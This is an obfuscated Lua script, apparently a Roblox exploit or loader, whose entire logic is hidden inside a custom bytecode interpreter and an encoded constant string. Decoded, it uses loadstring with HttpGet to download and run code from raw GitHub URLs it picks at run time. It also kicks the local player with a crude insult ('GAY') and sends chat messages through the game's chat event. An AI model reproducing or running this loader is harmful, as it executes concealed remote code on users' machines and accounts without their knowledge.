local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v87=v2(v0(v30,16));if v19 then local v97=v5(v87,v19);v19=nil;return v97;else return v87;end end end);local function v20(v31,v32,v33)if v33 then local v88=(v31/(2^(v32-1)))%(2^(((v33-1) -(v32-1)) + 1)) ;return v88-(v88%1) ;else local v89=2^(v32-1) ;return (((v31%(v89 + v89))>=v89) and 1) or 0 ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + 2 ;return (v36 * 256) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + 4 ;return (v40 * 16777216) + (v39 * 65536) + (v38 * 256) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,1,20) * (2^32)) + v41 ;local v45=v20(v42,21,31);local v46=((v20(v42,32)==1) and  -1) or 1 ;if (v45==0) then if (v44==0) then return v46 * 0 ;else v45=1;v43=0;end elseif (v45==2047) then return ((v44==0) and (v46 * (1/0))) or (v46 * NaN) ;end return v8(v46,v45-1023 ) * (v43 + (v44/(2^52))) ;end local function v25(v47)local v48;if  not v47 then v47=v23();if (v47==0) then return "";end end v48=v3(v16,v18,(v18 + v47) -1 );v18=v18 + v47 ;local v49={};for v63=1, #v48 do v49[v63]=v2(v1(v3(v48,v63,v63)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50={};local v51={};local v52={};local v53={v50,v51,nil,v52};local v54=v23();local v55={};for v65=1,v54 do local v66=v21();local v67;if (v66==1) then v67=v21()~=0 ;elseif (v66==2) then v67=v24();elseif (v66==3) then v67=v25();end v55[v65]=v67;end v53[3]=v21();for v69=1,v23() do local v70=v21();if (v20(v70,1,1)==0) then local v93=v20(v70,2,3);local v94=v20(v70,4,6);local v95={v22(),v22(),nil,nil};if (v93==0) then v95[3]=v22();v95[4]=v22();elseif (v93==1) then v95[3]=v23();elseif (v93==2) then v95[3]=v23() -(2^16) ;elseif (v93==3) then v95[3]=v23() -(2^16) ;v95[4]=v22();end if (v20(v94,1,1)==1) then v95[2]=v55[v95[2]];end if (v20(v94,2,2)==1) then v95[3]=v55[v95[3]];end if (v20(v94,3,3)==1) then v95[4]=v55[v95[4]];end v50[v69]=v95;end end for v71=1,v23() do v51[v71-1 ]=v28();end return v53;end local function v29(v57,v58,v59)local v60=v57[1];local v61=v57[2];local v62=v57[3];return function(...)local v73=v60;local v74=v61;local v75=v62;local v76=v27;local v77=1;local v78= -1;local v79={};local v80={...};local v81=v12("#",...) -1 ;local v82={};local v83={};for v90=0,v81 do if (v90>=v75) then v79[v90-v75 ]=v80[v90 + 1 ];else v83[v90]=v80[v90 + 1 ];end end local v84=(v81-v75) + 1 ;local v85;local v86;while true do v85=v73[v77];v86=v85[1];if (v86<=42) then if (v86<=20) then if (v86<=9) then if (v86<=4) then if (v86<=1) then if (v86>0) then if  not v83[v85[2]] then v77=v77 + 1 ;else v77=v85[3];end else local v114=v85[2];v83[v114]=v83[v114](v83[v114 + 1 ]);end elseif (v86<=2) then v83[v85[2]]=v85[3] + v83[v85[4]] ;elseif (v86>3) then if (v85[2]==v83[v85[4]]) then v77=v77 + 1 ;else v77=v85[3];end else v83[v85[2]]=v85[3]~=0 ;end elseif (v86<=6) then if (v86==5) then v83[v85[2]]=v83[v85[3]][v85[4]];else v83[v85[2]]=v83[v85[3]] -v85[4] ;end elseif (v86<=7) then v59[v85[3]]=v83[v85[2]];elseif (v86==8) then v83[v85[2]]=v83[v85[3]] + v85[4] ;else v83[v85[2]][v83[v85[3]]]=v83[v85[4]];end elseif (v86<=14) then if (v86<=11) then if (v86==10) then local v122=v85[2];local v123=v83[v122 + 2 ];local v124=v83[v122] + v123 ;v83[v122]=v124;if (v123>0) then if (v124<=v83[v122 + 1 ]) then v77=v85[3];v83[v122 + 3 ]=v124;end elseif (v124>=v83[v122 + 1 ]) then v77=v85[3];v83[v122 + 3 ]=v124;end elseif v83[v85[2]] then v77=v77 + 1 ;else v77=v85[3];end elseif (v86<=12) then local v126=v85[2];v83[v126](v13(v83,v126 + 1 ,v78));elseif (v86==13) then v83[v85[2]]={};else v83[v85[2]]=v83[v85[3]]%v83[v85[4]] ;end elseif (v86<=17) then if (v86<=15) then for v187=v85[2],v85[3] do v83[v187]=nil;end elseif (v86>16) then local v233=v85[2];local v234,v235=v76(v83[v233](v83[v233 + 1 ]));v78=(v235 + v233) -1 ;local v236=0;for v308=v233,v78 do v236=v236 + 1 ;v83[v308]=v234[v236];end else local v237=v85[2];local v238,v239=v76(v83[v237](v13(v83,v237 + 1 ,v85[3])));v78=(v239 + v237) -1 ;local v240=0;for v311=v237,v78 do v240=v240 + 1 ;v83[v311]=v238[v240];end end elseif (v86<=18) then v83[v85[2]]=v83[v85[3]];elseif (v86>19) then local v241=v85[2];v83[v241]=v83[v241](v13(v83,v241 + 1 ,v85[3]));else local v243=v85[2];v83[v243]=v83[v243](v83[v243 + 1 ]);end elseif (v86<=31) then if (v86<=25) then if (v86<=22) then if (v86>21) then local v129=v85[2];do return v13(v83,v129,v78);end else v83[v85[2]]=v85[3];end elseif (v86<=23) then local v132=v85[2];do return v83[v132](v13(v83,v132 + 1 ,v85[3]));end elseif (v86==24) then do return v83[v85[2]];end else local v245=v85[2];local v246=v83[v245 + 2 ];local v247=v83[v245] + v246 ;v83[v245]=v247;if (v246>0) then if (v247<=v83[v245 + 1 ]) then v77=v85[3];v83[v245 + 3 ]=v247;end elseif (v247>=v83[v245 + 1 ]) then v77=v85[3];v83[v245 + 3 ]=v247;end end elseif (v86<=28) then if (v86<=26) then local v133=v85[2];do return v13(v83,v133,v78);end elseif (v86==27) then local v249=v85[2];local v250,v251=v76(v83[v249](v13(v83,v249 + 1 ,v78)));v78=(v251 + v249) -1 ;local v252=0;for v314=v249,v78 do v252=v252 + 1 ;v83[v314]=v250[v252];end else v83[v85[2]]=v83[v85[3]][v85[4]];end elseif (v86<=29) then local v134=v85[2];local v135={v83[v134](v83[v134 + 1 ])};local v136=0;for v189=v134,v85[4] do v136=v136 + 1 ;v83[v189]=v135[v136];end elseif (v86>30) then local v255=v85[2];do return v83[v255](v13(v83,v255 + 1 ,v85[3]));end else v83[v85[2]]=v29(v74[v85[3]],nil,v59);end elseif (v86<=36) then if (v86<=33) then if (v86==32) then local v137=v85[2];local v138,v139=v76(v83[v137](v83[v137 + 1 ]));v78=(v139 + v137) -1 ;local v140=0;for v192=v137,v78 do v140=v140 + 1 ;v83[v192]=v138[v140];end else v77=v85[3];end elseif (v86<=34) then v83[v85[2]]=v83[v85[3]]%v83[v85[4]] ;elseif (v86==35) then local v257=v85[2];v83[v257](v13(v83,v257 + 1 ,v85[3]));else v83[v85[2]]=v85[3]~=0 ;end elseif (v86<=39) then if (v86<=37) then v83[v85[2]]=v59[v85[3]];elseif (v86>38) then local v259=v85[2];do return v13(v83,v259,v259 + v85[3] );end else v83[v85[2]]=v85[3] + v83[v85[4]] ;end elseif (v86<=40) then v83[v85[2]][v83[v85[3]]]=v83[v85[4]];elseif (v86==41) then local v261=v85[3];local v262=v83[v261];for v317=v261 + 1 ,v85[4] do v262=v262   .. v83[v317] ;end v83[v85[2]]=v262;else do return v83[v85[2]];end end elseif (v86<=64) then if (v86<=53) then if (v86<=47) then if (v86<=44) then if (v86>43) then v83[v85[2]]=v58[v85[3]];else v83[v85[2]]=v85[3];end elseif (v86<=45) then local v151=v85[2];v83[v151](v13(v83,v151 + 1 ,v85[3]));elseif (v86>46) then if (v83[v85[2]]==v85[4]) then v77=v77 + 1 ;else v77=v85[3];end else v83[v85[2]]=v83[v85[3]][v83[v85[4]]];end elseif (v86<=50) then if (v86<=48) then v83[v85[2]]= #v83[v85[3]];elseif (v86>49) then if (v85[2]==v83[v85[4]]) then v77=v77 + 1 ;else v77=v85[3];end else local v266=v85[2];v83[v266](v13(v83,v266 + 1 ,v78));end elseif (v86<=51) then local v153=v74[v85[3]];local v154;local v155={};v154=v10({},{__index=function(v195,v196)local v197=v155[v196];return v197[1][v197[2]];end,__newindex=function(v198,v199,v200)local v201=v155[v199];v201[1][v201[2]]=v200;end});for v203=1,v85[4] do v77=v77 + 1 ;local v204=v73[v77];if (v204[1]==54) then v155[v203-1 ]={v83,v204[3]};else v155[v203-1 ]={v58,v204[3]};end v82[ #v82 + 1 ]=v155;end v83[v85[2]]=v29(v153,v154,v59);elseif (v86>52) then if v83[v85[2]] then v77=v77 + 1 ;else v77=v85[3];end else v83[v85[2]]=v59[v85[3]];end elseif (v86<=58) then if (v86<=55) then if (v86>54) then local v157=v74[v85[3]];local v158;local v159={};v158=v10({},{__index=function(v206,v207)local v208=v159[v207];return v208[1][v208[2]];end,__newindex=function(v209,v210,v211)local v212=v159[v210];v212[1][v212[2]]=v211;end});for v214=1,v85[4] do v77=v77 + 1 ;local v215=v73[v77];if (v215[1]==54) then v159[v214-1 ]={v83,v215[3]};else v159[v214-1 ]={v58,v215[3]};end v82[ #v82 + 1 ]=v159;end v83[v85[2]]=v29(v157,v158,v59);else v83[v85[2]]=v83[v85[3]];end elseif (v86<=56) then v83[v85[2]]=v58[v85[3]];elseif (v86>57) then local v269=v85[2];local v270=v85[4];local v271=v269 + 2 ;local v272={v83[v269](v83[v269 + 1 ],v83[v271])};for v322=1,v270 do v83[v271 + v322 ]=v272[v322];end local v273=v272[1];if v273 then v83[v271]=v273;v77=v85[3];else v77=v77 + 1 ;end else v83[v85[2]]();end elseif (v86<=61) then if (v86<=59) then v83[v85[2]]= #v83[v85[3]];elseif (v86==60) then local v274=v85[2];local v275=v83[v85[3]];v83[v274 + 1 ]=v275;v83[v274]=v275[v85[4]];else local v279=v85[2];local v280=v83[v279];local v281=v83[v279 + 2 ];if (v281>0) then if (v280>v83[v279 + 1 ]) then v77=v85[3];else v83[v279 + 3 ]=v280;end elseif (v280<v83[v279 + 1 ]) then v77=v85[3];else v83[v279 + 3 ]=v280;end end elseif (v86<=62) then local v166=v85[2];v83[v166]=v83[v166](v13(v83,v166 + 1 ,v78));elseif (v86>63) then local v282=v85[2];v83[v282]=v83[v282](v13(v83,v282 + 1 ,v78));else v83[v85[2]]=v83[v85[3]]%v85[4] ;end elseif (v86<=75) then if (v86<=69) then if (v86<=66) then if (v86==65) then if  not v83[v85[2]] then v77=v77 + 1 ;else v77=v85[3];end else local v168=v85[2];local v169,v170=v76(v83[v168](v13(v83,v168 + 1 ,v85[3])));v78=(v170 + v168) -1 ;local v171=0;for v217=v168,v78 do v171=v171 + 1 ;v83[v217]=v169[v171];end end elseif (v86<=67) then local v172=v85[2];local v173=v83[v85[3]];v83[v172 + 1 ]=v173;v83[v172]=v173[v85[4]];elseif (v86==68) then v77=v85[3];else local v287=v85[2];v83[v287]=v83[v287](v13(v83,v287 + 1 ,v85[3]));end elseif (v86<=72) then if (v86<=70) then for v220=v85[2],v85[3] do v83[v220]=nil;end elseif (v86>71) then v83[v85[2]]=v83[v85[3]][v83[v85[4]]];else v83[v85[2]]={};end elseif (v86<=73) then v83[v85[2]]=v83[v85[3]] + v85[4] ;elseif (v86==74) then local v292=v85[3];local v293=v83[v292];for v325=v292 + 1 ,v85[4] do v293=v293   .. v83[v325] ;end v83[v85[2]]=v293;else local v295=v85[2];local v296,v297=v76(v83[v295](v13(v83,v295 + 1 ,v78)));v78=(v297 + v295) -1 ;local v298=0;for v326=v295,v78 do v298=v298 + 1 ;v83[v326]=v296[v298];end end elseif (v86<=80) then if (v86<=77) then if (v86>76) then v83[v85[2]]();else v83[v85[2]]=v83[v85[3]]%v85[4] ;end elseif (v86<=78) then do return;end elseif (v86>79) then do return;end else local v299=v85[2];local v300={v83[v299](v83[v299 + 1 ])};local v301=0;for v329=v299,v85[4] do v301=v301 + 1 ;v83[v329]=v300[v301];end end elseif (v86<=83) then if (v86<=81) then local v179=v85[2];local v180=v83[v179];local v181=v83[v179 + 2 ];if (v181>0) then if (v180>v83[v179 + 1 ]) then v77=v85[3];else v83[v179 + 3 ]=v180;end elseif (v180<v83[v179 + 1 ]) then v77=v85[3];else v83[v179 + 3 ]=v180;end elseif (v86==82) then if (v83[v85[2]]==v85[4]) then v77=v77 + 1 ;else v77=v85[3];end else v83[v85[2]]=v29(v74[v85[3]],nil,v59);end elseif (v86<=84) then local v182=v85[2];local v183=v85[4];local v184=v182 + 2 ;local v185={v83[v182](v83[v182 + 1 ],v83[v184])};for v222=1,v183 do v83[v184 + v222 ]=v185[v222];end local v186=v185[1];if v186 then v83[v184]=v186;v77=v85[3];else v77=v77 + 1 ;end elseif (v86==85) then v83[v85[2]]=v83[v85[3]] -v85[4] ;else v59[v85[3]]=v83[v85[2]];end v77=v77 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!313O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E73657274030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F646732697567657367682F7266736476333234742F6D61696E2F6532337632652E6C756103043O0072616E6403043O006D61746803063O0072616E646F6D028O00025O00E06F402O033O00706C6E03073O00506C6179657273030B3O004C6F63616C506C6179657203093O0043686172616374657203043O004E616D6503093O006D616B655F72616E6403043O006C652O7403013O006C03093O004E616D655F4D656E75030C3O008521021E66A7FE903240782003073O00CB44705613C5DE03013O005D03023O00626C03063O007072696E745F03043O0066696E64026O00F03F03043O004B69636B033D3O00452O726F7220636F64653A20474159200A5B204D6164652077697468202O3F2062792052616E676523382O393820616E64205265796E2337353235205D030A3O0006F41BBC6759DC079C7703073O0026BD569C201885030A3O004765745365727669636503113O0074F947AB4FFF56B343F864B349EE56A04303043O00269C37C7031B3O0044656661756C744368617453797374656D436861744576656E747303113O005361794D652O7361676552657175657374030A3O00466972655365727665722O033O0062A47103083O0023C81D1C4873149A03493O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F646732697567657367682F7266736476333234742F6D61696E2F6D444E6168323368642E6C7561034A3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F646732697567657367682F7266736476333234742F6D61696E2F626A72333738366667682E6C756100883O0012253O00013O00201C5O0002001225000100013O00201C000100010003001225000200013O00201C000200020004001225000300053O0006410003000A000100010004443O000A0001001225000300063O00201C000400030007001225000500083O00201C000500050009001225000600083O00201C00060006000A00063700073O000100062O00363O00064O00368O00363O00044O00363O00014O00363O00024O00363O00053O0012250008000B3O0012250009000C3O00203C00090009000D001215000B000E4O0024000C00014O00420009000C4O004000083O00022O0039000800010001001225000800103O00201C000800080011001215000900123O001215000A00134O00140008000A00020012070008000F3O0012250008000C3O00201C00080008001500201C00080008001600201C00080008001700201C000800080018001207000800143O00021E000800013O001207000800193O0012150008001B3O0012070008001A4O0012000800073O0012150009001D3O001215000A001E4O00140008000A00020012250009001A3O001215000A001F4O004A00080008000A0012070008001C3O001225000800193O001225000900206O000800020002001207000800203O001225000800193O001225000900216O000800020002001207000800213O001225000800083O00201C000800080022001225000900203O001225000A00143O001225000B000F4O004A000A000A000B2O00140008000A00020006350008006D00013O0004443O006D0001001215000800124O00460009000A3O00262F00080052000100230004443O00520001001225000B000C3O00201C000B000B001500201C000B000B001600203C000B000B0024001215000D00254O0023000B000D00010004443O0087000100262F00080049000100120004443O004900012O0012000B00073O001215000C00263O001215000D00274O0014000B000D00022O00120009000B3O001225000B000C3O00203C000B000B00282O0012000D00073O001215000E00293O001215000F002A4O0042000D000F4O0040000B3O000200201C000B000B002B00201C000B000B002C00203C000B000B002D2O0012000D00094O0012000E00073O001215000F002E3O0012150010002F4O0042000E00104O0040000B3O00022O0012000A000B3O001215000800233O0004443O004900010004443O00870001001225000800083O00201C000800080022001225000900213O001225000A00143O001225000B000F4O004A000A000A000B2O00140008000A00020006350008007F00013O0004443O007F00010012250008000B3O0012250009000C3O00203C00090009000D001215000B00304O0024000C00014O00420009000C4O004000083O00022O00390008000100010004443O008700010012250008000B3O0012250009000C3O00203C00090009000D001215000B00314O0024000C00014O00420009000C4O004000083O00022O00390008000100012O004E3O00013O00023O00023O00026O00F03F026O00704002284O000D00025O001215000300014O003000045O001215000500013O00043D0003002300012O003800076O0012000800024O0038000900014O0038000A00024O0038000B00034O0038000C00044O0012000D6O0012000E00063O002008000F000600012O0042000C000F4O0040000B3O00022O0038000C00034O0038000D00044O0012000E00013O002006000F000600012O0030001000014O0022000F000F0010001026000F0001000F0020060010000600012O0030001100014O00220010001000110010260010000100100020080010001000012O0042000D00104O004B000C6O0040000A3O000200204C000A000A00022O00110009000A4O000C00073O00010004190003000500012O0038000300054O0012000400024O0017000300044O001600036O004E3O00017O00053O00028O0003043O00612O723103063O0069706169727303043O0072616E64026O00F03F01173O001215000100013O000E3200010011000100010004443O001100012O000D00025O001207000200023O001225000200034O001200036O001D0002000200040004443O000E0001001225000700024O002E00083O0005001225000900044O004A0008000800092O002800070005000800065400020009000100020004443O00090001001215000100053O00262F00010001000100050004443O00010001001225000200024O0018000200023O0004443O000100012O004E3O00017O00",v9(),...);